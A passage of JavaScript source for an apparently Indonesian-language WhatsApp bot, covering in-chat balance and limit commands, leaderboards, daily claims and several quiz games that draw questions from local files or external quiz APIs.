let toplocal = '*── 「 TOP LOCAL 」 ──*\n\n'
let arrTop = []
let anggroup = groupMembers.map(a => a.jid)
for (let i = 0; i < balance.length; i ++){
if (arrTop.length >= 257) continue
if (anggroup.includes(balance[i].id)) {
toplocal += `
◪ *${i + 1}. @${balance[i].id.split("@")[0]}*
└❑ *Balance : $${balance[i].balance}*\n\n`
arrTop.push(balance[i].id)
}
}
mentions(toplocal, arrTop, true)
}
break

case 'topglimit': case 'topgamelimit':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2)return mentions(mess.OnlySurya, [Suryaa], true)
if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
glimit.sort((a, b) => (a.glimit < b.glimit) ? 1 : -1)
let topglimit = '*── 「 TOP GAME LIMIT 」 ──*\n\n'
let arrTop = []
let anggc = groupMembers.map(a => a.jid)
for (let i = 0; i < glimit.length; i ++){
if (arrTop.length >= 257) continue
if (anggc.includes(glimit[i].id)) {
topglimit += `
◪ *${i + 1}. @${glimit[i].id.split("@")[0]}*
└❑ *Game limit : ${glimit[i].glimit}*\n\n`
arrTop.push(glimit[i].id)
}
}
mentions(topglimit, arrTop, true)
}
break

case 'toplimit': case 'toplimit':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2)return mentions(mess.OnlySurya, [Suryaa], true)
if (!isGroup)return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
limit.sort((a, b) => (a.limit < b.limit) ? 1 : -1)
let toplimit = '*── 「 TOP LIMIT 」 ──*\n\n'
let arrTop = []
let anggrup = groupMembers.map(a => a.jid)
for (let i = 0; i < limit.length; i ++){
if (arrTop.length >= 257) continue
if (anggrup.includes(limit[i].id)) {
toplimit += `
◪ *${i + 1}. @${limit[i].id.split("@")[0]}*
└❑ *Limit : ${limit[i].limit}*\n\n`
arrTop.push(limit[i].id)
}
}
mentions(toplimit, arrTop, true)
}
break

case 'buylimit':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (args.length < 2) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli

Harga 1 limit = $${harganya} balance`)
if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(args[1])) return reply(`Harus berupa angka`)
let ane = Number(nebal(args[1]) * `${harganya}`)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(args[1]), limit)
reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
}
break
case 'giftlimit': case 'givelimit':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q)return reply(`Example : ${prefix + command} @tag 10`)
let lim = q.split(" ")[1]
const tag1 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
giveLimit(tag1, lim, limit)
reply('Sukses')
break

case 'claim':
case 'klaim':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isClaimOn) return textImg(`Kamu sudah melakukan claim sebelumnya, Harap claim lagi di esok hari.`)
const amountexp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
level.addLevelingXp(sender, amountexp, _level)
let hadippp = randomNomor(10000)
addBalance(sender, hadippp, balance)
_claim.push(sender)
fs.writeFileSync('./database/claim.json', JSON.stringify(_claim))
textImg(`
 *── 「 CLAIM」 ──*

Selamat kamu mendapatkan *10* EXP dan *$${hadippp}* balance Dari claim harian!`)
break

case 'giftglimit': case 'giveglimit':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q)return reply(`Example : ${prefix + command} @tag 10`)
let glim = q.split(" ")[1]
const tag2 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
givegame(tag2, glim, glimit)
reply('Sukses')
break

case 'giftbalan': case 'givebalance':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if(!fromMe && !isOwner2 && !isOwner)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q)return reply(`Example : ${prefix + command} @tag 10`)
let balanc = q.split(" ")[1]
const tag3 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
addBalance(tag3, balanc, balance)
reply('Sukses')
break

case 'delbalance': case 'hapusbalance':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if(!fromMe && !isOwner2 && !isOwner)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q)return reply(`Example : ${prefix + command} @tag 10`)
let balan = q.split(" ")[1]
const tag4 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
kurangBalance(tag4, balan, balance)
reply('Sukses')
break

case 'buygamelimit': case 'buyglimit':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (args.length < 2) return textImg(`Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli

Harga 1 game limit = $${harganya} balance
Pajak $1 / $10`)
if (args[1].includes('-')) return textImg(`Jangan menggunakan -`)
if (isNaN(args[1])) return textImg(`Harus berupa angka`)
let ane = Number(nebal(args[1]) * `${harganya}`)
if (getBalance(sender, balance) < ane) return textImg(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
givegame(sender, nebal(args[1]), glimit)
reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil

Sisa Balance : $${getBalance(sender, balance)}
Sisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
}
break

case 'cekhistory':
if (!isGroup) return reply(mess.OnlyGrup)
reply(`\`\`\`「 Status Tictactoe 」\`\`\`\n•> Win : ${checkWin(sender)}\n•> Lose : ${checkLose(sender)}`)

case 'tictactoe':case 'ttt':case 'tt':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (args.length < 1) return reply(`Kirim perintah *${prefix}tictactoe* @tag`)
if (isTTT) return textImg(`Masih ada game yg blum selesai`)
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return
let mentss = msg.message.extendedTextMessage.contextInfo.mentionedJid
var er1 = sender
var er2 = mentss[0]
let angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
let id = from
let gilir = er2
let h = randomNomor(`${balancettt}`)
hadiah = h
ky_ttt.push({er1,er2,id,angka,gilir})
surya.sendMessage(from, `@${sender.split('@')[0]} menantang @${er2.split('@')[0]} untuk bermain TicTacToe

Kirim (Y/T) untuk bermain

Hadiah : ${h} balance`, text, {contextInfo: {"mentionedJid": [sender, er2]}})
break
case 'delttt': case 'delttc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (!isPremium && !isOwner && !fromMe && !isOwner2) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (!isTTT) return textImg(`Tidak ada sesi game tictactoe di grup ini`)
let naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
textImg(`Berhasil menghapus sesi tictactoe di grup ini`)
break

case 'mtk': case 'math':{
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
if (!q) return reply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}`)
//const petunjuk = anu.data.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
reply(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.soal} :

Waktu : ${mathwaktu} detik`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
}
break
case 'mtk1':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=very_easy`)
reply(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.soal} :

Waktu : ${mathwaktu} detik`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
}
break
case 'mtk2':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=easy`)
reply(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.soal} :

Waktu : ${mathwaktu} detik`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
}
break
case 'mtk3':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=medium`)
reply(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.soal} :

Waktu : ${mathwaktu} detik`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
}
break
case 'mtk4':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=hard`)
reply(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.soal} :

Waktu : ${mathwaktu} detik`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
}
break
case 'mtk5':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=extreme`)
reply(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.soal} :

Waktu : ${mathwaktu} detik`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
}
break
case 'mtk6':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=impossible`)
reply(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.soal} :

Waktu : ${mathwaktu} detik`)
let anih = anu.data.jawaban.toLowerCase()
game.addmtk(from, anih, gamewaktu, mtk)
gameAdd(sender, glimit)
}
break

case 'tebakgambar': case 'tg':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakGambar(from, tebakgambar)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datagambar = fs.readFileSync('./database/data/tebakgambar.js')
let tebagambar = JSON.parse(datagambar)
let tbgambar = Math.floor(Math.random() * tebagambar.length);
let RandGambar = tebagambar[tbgambar]
let tgam = await getBuffer(RandGambar.result.img)
let gtbg = `_*Silahkan jawab soal berikut ini*_

${S}Petunjuk : ${RandGambar.result.deskripsi}

Waktu : ${tgwaktu} detik${S}`
surya.sendMessage(from, tgam, image, {contextInfo: { forwardingScore: 9999, isForwarded: false, mentionedJid: [sender]}, quoted: msg, caption: gtbg})
let anh = RandGambar.result.jawaban.toLowerCase()
game.addgambar(from, anh, gamewaktu, tebakgambar)
gameAdd(sender, glimit)
}
}
if (gamemode === 'true'){
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakGambar(from, tebakgambar)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/gambar2?apikey=${lolkey}`)
const petunjuk = anu.data.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
sendFileFromUrl(from, anu.data.result.image, monospace(`Silahkan jawab soal berikut ini

Petunjuk : ${petunjuk}

Waktu : ${tgwaktu} detik`), msg)
let anih = anu.data.result.answer.toLowerCase()
game.addgambar(from, anih, gamewaktu, tebakgambar)
gameAdd(sender, glimit)
}
break

case 'susunkata': case 'sk':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isSusunKata(from, susunkata)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datask = fs.readFileSync('./database/data/susunkata.js')
let gamesk = JSON.parse(datask)
let tbsk = Math.floor(Math.random() * gamesk.length);
let Randsk = gamesk[tbsk]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randsk.result.soal}

Waktu : ${gamewaktu}s`)
let gmsk = Randsk.result.jawaban.toLowerCase()
game.addsusunkata(from, gmsk, gamewaktu, susunkata)
gameAdd(sender, glimit)
}
if (gamemode === 'true'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isSusunKata(from, susunkata)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${lolkey}`)
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.result.pertanyaan}

Waktu : ${gamewaktu}s`)
let ahhh = anu.data.result.jawaban.toLowerCase()
game.addsusunkata(from, ahhh, gamewaktu, susunkata)
gameAdd(sender, glimit)
}
break

case 'asahotak': case 'ao':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isAsahOtak(from, asahotak)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datasah = fs.readFileSync('./database/data/asahotak.js')
let tebaksah = JSON.parse(datasah)
let tbotak = Math.floor(Math.random() * tebaksah.length);
let Randao = tebaksah[tbotak]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randao.result.soal}

Waktu : ${gamewaktu}s`)
let tbaotk = Randao.result.jawaban.toLowerCase()
game.addotak(from, tbaotk, gamewaktu, asahotak)
gameAdd(sender, glimit)
}
if (gamemode === 'true'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isAsahOtak(from, asahotak)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=${lolkey}`)
const petunjuk = anu.data.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.result.pertanyaan}

Petunjuk : ${petunjuk}


Waktu : ${gamewaktu}s`)
let anjay = anu.data.result.jawaban.toLowerCase()
game.addotak(from, anjay, gamewaktu, asahotak)
gameAdd(sender, glimit)
}
break

case 'caklontong': case 'cl':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isCakLontong(from, caklontong)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datacak = fs.readFileSync('./database/data/caklontong.js')
let tebacak = JSON.parse(datacak)
let tbcak = Math.floor(Math.random() * tebacak.length);
let Randcak = tebacak[tbcak]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randcak.result.soal}
*Deskripsi :* ${Randcak.result.deskripsi}

Waktu : ${gamewaktu}s`)
let tbc = Randcak.result.jawaban.toLowerCase()
game.addcak(from, tbc, gamewaktu, caklontong)
gameAdd(sender, glimit)
}
if (gamemode === 'true'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isCakLontong(from, caklontong)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${lolkey}`)
const petunjuk = anu.data.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.result.question}

*Petunjuk :* ${petunjuk}

Waktu : ${gamewaktu}s`)
let anah = anu.data.result.answer.toLowerCase()
game.addcak(from, anah, gamewaktu, caklontong)
gameAdd(sender, glimit)
}
break

case 'tebaklirik': case 'tl':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakLirik(from, tebaklirik)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datal = fs.readFileSync('./database/data/tebaklirik.js')
let tebal = JSON.parse(datal)
let tbl = Math.floor(Math.random() * tebal.length);
let Randl = tebal[tbl]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randl.result.soal}

Waktu : ${gamewaktu}s`)
let tblirik = Randl.result.jawaban.toLowerCase()
game.addlirik(from, tblirik, gamewaktu, tebaklirik)
gameAdd(sender, glimit)
}
if (gamemode === 'true'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakLirik(from, tebaklirik)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=${lolkey}`)
const petunjuk = anu.data.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.result.question}

Petunjuk : ${petunjuk}

Waktu : ${gamewaktu}s`)
let anal = anu.data.result.answer.toLowerCase()
game.addlirik(from, anal, gamewaktu, tebaklirik)
gameAdd(sender, glimit)
}
break

case 'family100': case 'f100':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (isfam(from, family100)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datafam = fs.readFileSync('./database/data/family100.js')
let tebakfam = JSON.parse(datafam)
let tbfam = Math.floor(Math.random() * tebakfam.length);
let Randfam = tebakfam[tbfam]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randfam.result.soal}

Waktu : ${gamewaktu}s`)
//let famil = Randfam.result.jawaban.toLowerCase()
let anos = Randfam.result.jawaban
let famil = []
for (let i of anos){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
addfam(from, famil, gamewaktu, family100)
gameAdd(sender, glimit)
}
if (gamemode === 'true'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isfam(from, family100)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolkey}`)
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.result.question}
*Total Jawaban :* ${anu.data.result.aswer.length}

Waktu : ${gamewaktu}s`)
let anoh = anu.data.result.aswer
let rgfds = []
for (let i of anoh){
let fefs = i.split('/') ? i.split('/')[0] : i
let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
rgfds.push(axsf.toLowerCase())
}
game.addfam(from, rgfds, gamewaktu, family100)
gameAdd(sender, glimit)
}
break

case 'setgame': case 'gamemode':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
const setgame = [{buttonId: 'gamemode1', buttonText: {displayText: 'Pake api'}, type: 1},
{buttonId: 'gamemode0', buttonText: {displayText: 'No api'}, type: 1}]
const setgameMessage = {
contentText: `Pilih salah satu dibawah`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: setgame,
headerType: 1
}
surya.sendMessage(from, setgameMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, '0@s.whatsapp.net']}, quoted: msg})
break

case 'gamemode0':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
gamemode = 'false'
reply(mess.success)
break
case 'gamemode1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
gamemode = 'true'
reply(mess.success)
break

case 'siapakahaku': case 'sa':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return
if (isQuotedMsg)
if (!isGroup)return reply(mess.OnlyGrup)
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isSiapaAku(from, siapaaku)) return textImg(`Masih ada soal yang belum di selesaikan`)
let dataku = fs.readFileSync('./database/data/siapakahaku.js')
let tebaku = JSON.parse(dataku)
let tbsiapa = Math.floor(Math.random() * tebaku.length);
let Randaku = tebaku[tbsiapa]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randaku.result.soal}

Waktu : ${gamewaktu}s`)
let siapaku = Randaku.result.jawaban.toLowerCase()
game.addsurya(from, siapaku, gamewaktu, siapaaku)
gameAdd(sender, glimit)
}
if (gamemode === 'true'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isSiapaAku(from, siapaaku)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolkey}`)
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.result.question}

Waktu : ${gamewaktu}s`)
let anau = anu.data.result.answer.toLowerCase()
game.addsurya(from, anau, gamewaktu, siapaaku)
gameAdd(sender, glimit)
}
break

case 'tekateki': case 'ttk':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTekaTeki(from, tekateki)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datateka = fs.readFileSync('./database/data/tekateki.js')
let tebakteka = JSON.parse(datateka)
let tbteka = Math.floor(Math.random() * tebakteka.length);
let Randteka = tebakteka[tbteka]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randteka.result.soal}

Waktu : ${gamewaktu}s`)
let tteki = Randteka.result.jawaban.toLowerCase()
game.addtekateki(from, tteki, gamewaktu, tekateki)
gameAdd(sender, glimit)
break

case 'tebakkalimat': case 'tkl':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakKalimat(from, tebakkalimat)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datakalimat = fs.readFileSync('./database/data/tebakkalimat.js')
let tebakalimat = JSON.parse(datakalimat)
let tbkalimat = Math.floor(Math.random() * tebakalimat.length);
let Randkalimat = tebakalimat[tbkalimat]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randkalimat.result.soal}

Waktu : ${gamewaktu}s`)
let tkalimat = Randkalimat.result.jawaban.toLowerCase()
game.addkalimat(from, tkalimat, gamewaktu, tebakkalimat)
gameAdd(sender, glimit)
break

